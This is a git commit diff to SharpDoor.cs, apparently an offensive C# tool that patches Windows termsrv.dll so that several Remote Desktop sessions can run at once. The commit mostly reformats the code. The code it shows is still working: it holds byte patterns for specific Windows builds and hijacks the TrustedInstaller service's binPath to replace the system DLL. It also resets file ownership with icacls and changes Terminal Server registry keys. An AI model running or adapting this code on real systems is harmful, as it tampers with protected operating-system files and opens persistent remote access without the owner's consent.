ff8fc31563673c18fc5ebdcd1667006eef3d0d55
Rahmat Nurfauzi <rahmat.nf42@gmail.com>
2019-09-30 23:08:09 +0700

    Fix Bugs

--- SharpDoor.cs
+++ SharpDoor.cs
@@ -11,7 +11,20 @@ using System.Security.Principal;
 namespace SharpDoor {
 	public class Program {
 		public static byte[] PatchFind = {};
-		public static byte[] PatchReplace = { 0xB8, 0x00, 0x01, 0x00, 0x00, 0x89, 0x81, 0x38, 0x06, 0x00, 0x00, 0x90 };
+		public static byte[] PatchReplace = {
+			0xB8,
+			0x00,
+			0x01,
+			0x00,
+			0x00,
+			0x89,
+			0x81,
+			0x38,
+			0x06,
+			0x00,
+			0x00,
+			0x90
+		};
 
 		static void Main(string[] args) {
 
@@ -48,27 +61,27 @@ namespace SharpDoor {
 
 				Console.WriteLine("\n[*] Attempting to patch termsrv.dll");
 				PatchFile(@"C:\Users\Public\termsrv.dll", @"C:\Users\Public\termsrv.patch.dll");
-                Thread.Sleep(2000);
+				Thread.Sleep(2000);
 
-                executeCommand("sc config TrustedInstaller binPath= \"cmd /c move C:\\Users\\Public\\termsrv.patch.dll C:\\Windows\\System32\\termsrv.dll\"");
-                executeCommand("sc start \"TrustedInstaller\"");
-                Thread.Sleep(2000);
+				executeCommand("sc config TrustedInstaller binPath= \"cmd /c move C:\\Users\\Public\\termsrv.patch.dll C:\\Windows\\System32\\termsrv.dll\"");
+				executeCommand("sc start \"TrustedInstaller\"");
+				Thread.Sleep(2000);
 
-                executeCommand("icacls \"C:\\Windows\\System32\\termsrv.dll\" /setowner \"NT SERVICE\\TrustedInstaller\"");
+				executeCommand("icacls \"C:\\Windows\\System32\\termsrv.dll\" /setowner \"NT SERVICE\\TrustedInstaller\"");
 				executeCommand("icacls \"C:\\Windows\\System32\\termsrv.dll\" /grant \"NT SERVICE\\TrustedInstaller:(RX)\"");
 
-                Console.WriteLine("[*] Setting Registry Terminal Server\\fSingleSessionPerUser to 0");
-                RegistryKey reg_key1 = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
-                reg_key1.SetValue("fSingleSessionPerUser", 0, RegistryValueKind.DWord);
+				Console.WriteLine("[*] Setting Registry Terminal Server\\fSingleSessionPerUser to 0");
+				RegistryKey reg_key1 = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
+				reg_key1.SetValue("fSingleSessionPerUser", 0, RegistryValueKind.DWord);
 
-                Console.WriteLine("[*] Setting Registry Terminal Server\\TSAppAllowList\\fDisabledAllowList to 1");
-                RegistryKey reg_key2 = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList");
-                reg_key2.SetValue("fDisabledAllowList", 1, RegistryValueKind.DWord);
+				Console.WriteLine("[*] Setting Registry Terminal Server\\TSAppAllowList\\fDisabledAllowList to 1");
+				RegistryKey reg_key2 = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList");
+				reg_key2.SetValue("fDisabledAllowList", 1, RegistryValueKind.DWord);
 
-                Console.WriteLine("[*] Start termservice");
+				Console.WriteLine("[*] Start termservice");
 				executeCommand(@"net start termservice /y");
 
-                Console.WriteLine("[*] Done");
+				Console.WriteLine("[*] Done");
 			}
 			catch(Exception e) {
 				Console.WriteLine("\r\n[!] Unhandled SharpDoor exception:\r\n");
@@ -118,26 +131,102 @@ namespace SharpDoor {
 		private static void TermsrvPatchVersion(string termsrvVersion) {
 			// www.mysysadmintips.com/windows/clients/545-multiple-rdp-remote-desktop-sessions-in-windows-10
 			if (termsrvVersion == "10.0.17763.1") {
-				PatchFind = new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x7F, 0x2C, 0x01, 0x00 };
+				PatchFind = new byte[] {
+					0x39,
+					0x81,
+					0x3C,
+					0x06,
+					0x00,
+					0x00,
+					0x0F,
+					0x84,
+					0x7F,
+					0x2C,
+					0x01,
+					0x00
+				};
 			}
-            else if (termsrvVersion == "10.0.17763.437")
-            {
-                PatchFind = new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x3B, 0x2B, 0x01, 0x00 };
-            }
-            else if (termsrvVersion == "10.0.17134.1") {
-				PatchFind = new byte[] { 0x8B, 0x99, 0x3C, 0x06, 0x00, 0x00, 0x8B, 0xB9, 0x38, 0x06, 0x00, 0x00 };
+			else if (termsrvVersion == "10.0.17763.437") {
+				PatchFind = new byte[] {
+					0x39,
+					0x81,
+					0x3C,
+					0x06,
+					0x00,
+					0x00,
+					0x0F,
+					0x84,
+					0x3B,
+					0x2B,
+					0x01,
+					0x00
+				};
+			}
+			else if (termsrvVersion == "10.0.17134.1") {
+				PatchFind = new byte[] {
+					0x8B,
+					0x99,
+					0x3C,
+					0x06,
+					0x00,
+					0x00,
+					0x8B,
+					0xB9,
+					0x38,
+					0x06,
+					0x00,
+					0x00
+				};
 			}
 			else if (termsrvVersion == "10.0.16299.15") {
-				PatchFind = new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0xB1, 0x7D, 0x02, 0x00 };
+				PatchFind = new byte[] {
+					0x39,
+					0x81,
+					0x3C,
+					0x06,
+					0x00,
+					0x00,
+					0x0F,
+					0x84,
+					0xB1,
+					0x7D,
+					0x02,
+					0x00
+				};
 			}
 			else if (termsrvVersion == "10.0.10240.16384") {
-				PatchFind = new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x73, 0x42, 0x02, 0x00 };
+				PatchFind = new byte[] {
+					0x39,
+					0x81,
+					0x3C,
+					0x06,
+					0x00,
+					0x00,
+					0x0F,
+					0x84,
+					0x73,
+					0x42,
+					0x02,
+					0x00
+				};
 			}
-            else if (termsrvVersion == "10.0.10586.0")
-            {
-                PatchFind = new byte[] { 0x39, 0x81, 0x3C, 0x06, 0x00, 0x00, 0x0F, 0x84, 0x3F, 0x42, 0x02, 0x00 };
-            }
-            else {
+			else if (termsrvVersion == "10.0.10586.0") {
+				PatchFind = new byte[] {
+					0x39,
+					0x81,
+					0x3C,
+					0x06,
+					0x00,
+					0x00,
+					0x0F,
+					0x84,
+					0x3F,
+					0x42,
+					0x02,
+					0x00
+				};
+			}
+			else {
 				Console.WriteLine("[!] Unknown Version");
 				System.Environment.Exit(0);
 			}
